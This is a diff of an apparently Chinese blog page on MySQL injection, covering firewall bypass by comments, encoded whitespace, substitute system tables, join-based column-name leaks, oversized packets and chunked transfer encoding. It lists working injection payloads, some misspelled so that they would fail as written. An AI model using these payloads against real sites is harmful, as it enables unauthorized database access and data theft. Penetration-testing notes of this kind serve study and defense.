@@ -338,12 +338,29 @@ select + 列名(* 代表所有) from + 查询表 + where + 查询内容
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/*!50000abc*/</span><br></pre></td></tr></table></figure>
 
 <p>这个表示数据库是<code>5.00.00</code>以上版本时，该语句才会被执行后面的<code>abc</code></p>
+<p>我们还可以使用注释<code>--+</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uninon <span class="comment">--+b%0A select</span></span><br></pre></td></tr></table></figure>
+
 <h3 id="空白符"><a href="#空白符" class="headerlink" title="空白符"></a>空白符</h3><p>使用<code>url</code>编码尝试绕过</p>
 <p><code>%09</code>：水平制表</p>
 <p><code>%0a</code>：新一行，<code>MySQL</code>可以让命令分行输入</p>
 <p><code>%0c</code>：新一页</p>
 <p><code>%0b</code>：纵向的 TabLayout</p>
-<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">万能符号：</span><br><span class="line"></span><br><span class="line">union select  --&gt;</span><br><span class="line"></span><br><span class="line">union/*//--/*/select</span><br><span class="line"></span><br><span class="line">union select 1,2,3  --&gt; </span><br><span class="line"></span><br><span class="line">union /*!--+/*%0aselect/*!1,2,*/ 3</span><br></pre></td></tr></table></figure>
+<h3 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h3><p>当<code>information_schema.tables</code>被过滤时，我们可以使用另外的两张表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sys.schema_table_statistics_with_buffer</span><br><span class="line">sys.x$ps_schema_table_statistics_io</span><br></pre></td></tr></table></figure>
+
+<p>当<code>information_schema.columns</code>被过滤时，我们同样可以使用替换，我们采用<code>join</code>获取列名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-- 获取第一列列名</span><br><span class="line">union /*!70000 xxx*/ seleect * from (select * /*!70000 xxx*/ from /*!70000 xxx*/ users as a join users as b) as c</span><br><span class="line">-- 获取第二列列名</span><br><span class="line">uinon /*!70000 xxx*/ seleect * from (select * /*!70000 xxx*/ from /*!70000 xxx*/ users as a join users as b using(id)) as c</span><br><span class="line">-- 获取第三列列名</span><br><span class="line">uinon /*!70000 xxx*/ seleect * from (select * /*!70000 xxx*/ from /*!70000 xxx*/ users as a join users as b using(id,username)) as c</span><br></pre></td></tr></table></figure>
+
+<h3 id="超大数据包"><a href="#超大数据包" class="headerlink" title="超大数据包"></a>超大数据包</h3><p>仅能用于<code>Post</code>提交，对于安全狗<code>3.5</code>版本时，出现被阻拦时会出现<code>&#39;qt-block-indent:0; text-indent&#39;</code>的字样，对此我们可以使用<code>Python</code>的<code>requests</code>库来发送请求包，在我们的注入语句中加入<code>/*!XXX*/</code>更改<code>XXX</code>的长度，来尝试进行传大数据包绕过对应的防火墙</p>
+<h3 id="分块传输绕过"><a href="#分块传输绕过" class="headerlink" title="分块传输绕过"></a>分块传输绕过</h3><p>同样仅适用于<code>Post</code>提交方式，分块出啊u你是将我目的数据拆分成多个部分，然后由服务器端重新组合，然后完成对应的绕过</p>
+<p>需要添加一个分块传输的头</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: Chunked</span><br></pre></td></tr></table></figure>
+
+<p>随后使用<code>BurpSuit</code>的相关插件即可完成对应的传输</p>
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h4 id="万能符号"><a href="#万能符号" class="headerlink" title="万能符号"></a>万能符号</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select  --&gt; union/*//--/*/select</span><br><span class="line">union select 1,2,3  --&gt; union /*!--+/*%0aselect/*!1,2,*/ 3</span><br></pre></td></tr></table></figure>
+
+<h4 id="过滤-substr-和-mid-等"><a href="#过滤-substr-和-mid-等" class="headerlink" title="过滤 substr() 和 mid() 等"></a>过滤 substr() 和 mid() 等</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">left() 、 right() 、 mid() 、 substr() 、 substring() 、 lpad() 、 rpad() 等价</span><br></pre></td></tr></table></figure>
 
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
